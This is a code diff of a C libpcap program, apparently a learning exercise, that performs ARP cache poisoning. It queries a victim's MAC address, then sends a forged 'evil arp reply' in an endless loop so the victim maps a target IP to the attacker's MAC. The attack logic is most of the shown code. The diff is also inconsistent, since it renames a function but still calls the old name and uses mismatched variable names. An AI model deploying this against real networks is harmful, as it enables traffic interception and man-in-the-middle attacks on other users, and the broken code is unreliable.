@@ -100,7 +100,7 @@ int get_ip_by_inf(struct in_addr* ip, const char *dev){
 
 	return 1;
 }
-void make_arp_packet(u_char *packet[], int *length, int opcode, struct in_addr my_ip, struct in_addr victim_ip, u_char *my_mac, u_char *victim_mac){
+void arp_packet(u_char *packet[], int *length, int opcode, struct in_addr my_ip, struct in_addr victim_ip, u_char *my_mac, u_char *victim_mac){
 	struct ether_header eth;
 	struct ether_arp arp;
 	
@@ -216,67 +216,45 @@ int main(int argc, char *argv[])
 	
 	printf("send arp %s\n", argv[2]);
 
+	arp_packet(&packet, &length, ARPOP_REQUEST, my_ip_addr, victim_ip_addr, my_mac, NULL);
+	while(1){
+		flag = pcap_next_ex(handle, &header, &recv_packet);
+		if(flag == 1)
+			break;
 
-	/*packet[0]=255;
-    packet[1]=255;
-    packet[2]=255;
-    packet[3]=255;
-    packet[4]=255;
-    packet[5]=255;*/
-    
-    /* set mac source tomy mac */
-    /*packet[6]=0x00;
-    packet[7]=0x0b;
-    packet[8]=0xdb;
-    packet[9]=0xdd;
-    packet[10]=0x3f;
-    packet[11]=0xa1;*/
-	// type = arp
-	/*packet[12]=0x08;
-	packet[13]=0x06;*/
-	//data packet ************************************
-	// hardware type =1 ethernet  (6 IEE 802)
-	/*packet[14]=0x00;
-	packet[15]=0x01;
-	//protocol address type IPV4	
-	packet[16]=0x08;
-	packet[17]=0x00;
-	//hardware address length = mac size
-	packet[18]=0x06;
-	// protocol address length = ipv4 length
-	packet[19]=0x04;
-	// opcode 1 = request , 2= reply
-	packet[20]=0x00;
-	packet[21]=0x01;
-	//my mac
-	packet[22]=0x00;
-	packet[23]=0x0b;
-	packet[24]=0xdb;
-	packet[25]=0x5e;
-	packet[26]=0x3f;
-	packet[27]=0xa1;
-	//my ip
-	packet[28]=200;
-	packet[29]=100;
-	packet[30]=100;
-	packet[31]=2;
-	//packet[28]=argv[0];
-	//packet[29]=argv[1];
-	//packet[30]=argv[2];
-	//packet[31]=argv[3];
-	//dest mac 
-	packet[32]=0;
-	packet[33]=0;
-	packet[34]=0;
-	packet[35]=0;
-	packet[36]=0;
-	packet[37]=0;
-	//dest ip
-	packet[38]=81;
-	packet[39]=31;
-	packet[40]=164;
-	packet[41]=123;*/
+		else if(flag == -1){
+			fprintf(stderr, "network errer!! : %s\n", pcap_geterr(handle));
+			return -7;
+		}
+		else
+			fprintf(stderr, "timeout expired\n");
+	};
 
+	for(int i=6; i<12; i++){
+		vic_mac[i-6] = recv_packet[i];
+		printf("%02x", vic_mac[i-6]);
+		if(i != 11)
+			printf(":");
+	}
+
+	memset(packet, 0, length);
+	
+	length = 0;
+	
+	//build evil arp reply packet	
+	make_arp_packet(&packet, &length, ARPOP_REPLY, target_ip_addr, vic_ip_addr, my_mac, vic_mac);
+
+	//send evil arp reply packet
+
+	printf("\nsend evil arp reply to victim[%s] sfooping my ip[%s] to target ip[%s]\n", argv[2], ip_addr, argv[3]);
+
+	while(1){
+		if(pcap_sendpacket(handle, packet, length) != 0)
+			fprintf(stderr, "\nError sending the packet : %s\n", pcap_geterr(handle));
+	
+		sleep(500);
+	}	
+		
     
     /* Fill the rest of the packet */
    
@@ -284,14 +262,14 @@ int main(int argc, char *argv[])
 	{
         packet[i]=0;
     }*/
-	for(i=0;i<5;i++)
-	{
+	//for(i=0;i<5;i++)
+	//{
 
 
 	    /* Send down the packet */
-	    pcap_sendpacket(handle,packet,60);
+	    //pcap_sendpacket(handle,packet,60);
 
 	//pcap_sendqueue_transmit(outp, squeue, sync);
-	}
+	//}
 	return 0;
 }
